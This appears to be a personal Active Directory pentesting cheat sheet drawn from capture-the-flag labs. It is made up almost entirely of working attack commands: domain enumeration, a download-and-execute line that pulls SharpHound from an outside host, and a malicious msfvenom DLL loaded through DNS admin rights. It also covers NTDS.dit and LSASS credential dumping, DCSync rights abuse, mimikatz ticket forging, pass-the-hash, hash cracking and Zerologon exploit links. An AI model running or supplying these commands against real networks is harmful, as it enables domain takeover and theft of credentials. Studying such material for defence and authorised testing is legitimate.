## Tools

- [Powerview](/99_powerview.ps1)
- Bloodhound

### Domain Enumeration
- [Powerview Cheatsheet](/99_powerview_cheatsheet.md)

```powershell
powershell -ep bypass
. .\powerview.ps1

Get-NetDomain
Get-NetDomainController
Get-DomainPolcy
(Get-DomainPolicy)."system access"
Get-NetUser | select cn / select description / select
Get-UserProperty -Properties pwdlastset / logoncount / badpwdcount
Get-NetComputer -FullData | select OperatingSystem
Get-NetGroup -GroupName *admin*
Invoke-Sharefinder
Get-NetGPO | select displayname, whenchanged

```

#### other priv esc steps
```
winPEAS.exe # unquoted paths, writable directories, unusual progs / services, interesting files, credentials, ninjacopy potentials
```

#### basic enum
```
net accounts
net user
net user /domain
net user $user_name /domain
net group /domain
whoami /user
cmdkey /list


# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```

####  [bloodhound - for domain controllers](https://github.com/BloodHoundAD/BloodHound)
> [SharpHound.exe](https://github.com/BloodHoundAD/SharpHound3)


```
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.64/
SharpHound.ps1');Invoke-BloodHound -CollectionMethod All
## or

./BloodHound.bin --no-sandbox
locate neo4j | grep auth # delete to reset password
neo4j console # user:pass = neo4j:neo4j
# upload SharpHound and extract generated zip file - .\SharpHound.exe -c all --zipfilename hellothere.zip --encryptzip --stealth
# mark owner as owned
# show shortest path
# show path from owned principles
# nslookup any new domain objects found
# Any writedacl permissions / Account Operators / Group Permissions / account creation
# Exchange Server Group Permissions
```

#### Bloodhound with python
```
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d box.local -dc dc01.box.local -ns $(cat ip)
```

#### Using rpclient to reset user passwords
https://room362.com/post/2017/reset-ad-user-password-with-linux/
```
rpcclient $> setuserinfo2 ima-domainadmin 23 'ASDqwe123'
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
```

#### Using msfvenom to change Admin password - if rights allow (eg dns admin)
```
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -
f dll > df.dll
cmd /c dnscmd localhost /config /serverlevelplugindll m:\da.dll
sc.exe stop dns
sc.exe start dns
sudo psexec.py megabank.local/administrator@10.10.10.169
```


#### Using  pypykatz to retrieve Windows Credentials - lsass.dmp
```
sudo pip3 install pypykatz
pypykatz lsa minidump lsass.DMP
```

#### Using pypykatz with sam system reg save hkml\sam system
```
pypykatz registry --sam sam system
```

#### NTDS.dit
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> $pass = convertto-securestring 'df' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc_backup\Documents> $cred = New-Object System.Management.Automation.PSCredential('df',$pass)
*Evil-WinRM* PS C:\Users\svc_backup\Documents> New-PSDrive -Name 'm' -PSProvider FileSystem -Credential $cred -Root \\10.10.14.64\share
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-module .\Backup-dumpntds.ps1
Backup-DumpNTDS -path c:\exfil
cp ntds.dit m:\ntds.dit
cp system.dmp m:\system.dmp
```
```bash
impacket-secretsdump -system system.dmp -ntds ntds.dit LOCAL > secretsdump.txt
cat secretsdump.txt | grep -i admin > adminhash.ntds
```



#### adding users for priv esc [if able via compromised account permissions]
```
net user danko Passw0rd /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS" /add danko
Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=box,DC=domain' -PrincipleIdentity danko -Rights DCSync
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'danko' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync

net user user password /add /domain
net group "Group to add user to" /add owned_user

```


#### [Powersploit](https://github.com/PowerShellMafia/PowerSploit.git) - required for Add-DomainObjectAcl
```
git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev # dev branch
powerview.ps1

```
#### One liner add user to group and DCSync Priv
```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

#### Other PowerView Powersploit
```
Invoke-UserImpersonation -Credential $Cred

Import-Module .\PowerView.ps1
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPass
word
$cred = ConvertTo-SecureString "P@ssw0rd123!!!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```


#### impacket - secretsdump.py # dumping hashes from box
```
./secretsdump.py box.domain/createduser:password@target_IP
# crack hashes
hashcat -m 1000 hash.dump /opt/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
```

#### impacket - psexec
```
psexec.py admin@target_IP -hashes # blank LM hash
```


#### mimikatz
```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list /export
sekurlsa::pth /user:$user_name /domain:corporate.com / ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-10a20000-
user@Domain_Server.corp.com-CORP.COM.kirbi

kerberos::purge
kerberos::list
kerberos::golden /user:$user_name /domain:corporate.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /target:CorpServer.corporate.com /service:HTTP
/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
#rc4 = iis_service_account:password_hash
```

#### Kerberos Vulnerability in MS14-068

#### PyKEK (Python Kerberos Exploitation Kit)
[MS14-068](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)
```
python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
Password:
```

#### CVE-2020-1472 | Netlogon / Zerologin Elevation of Privilege Vulnerability / samAccountName Spoofing (CVE-2021–42278) & Domain Controller Impersonation (CVE-2021–42287)
```
https://github.com/WazeHell/sam-the-admin
https://github.com/dirkjanm/CVE-2020-1472
```


#### Pass the hash
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3bf05c425e //$IP cmd
crackmapexec smb $IP -u "User" -H $hash --local-auth
```
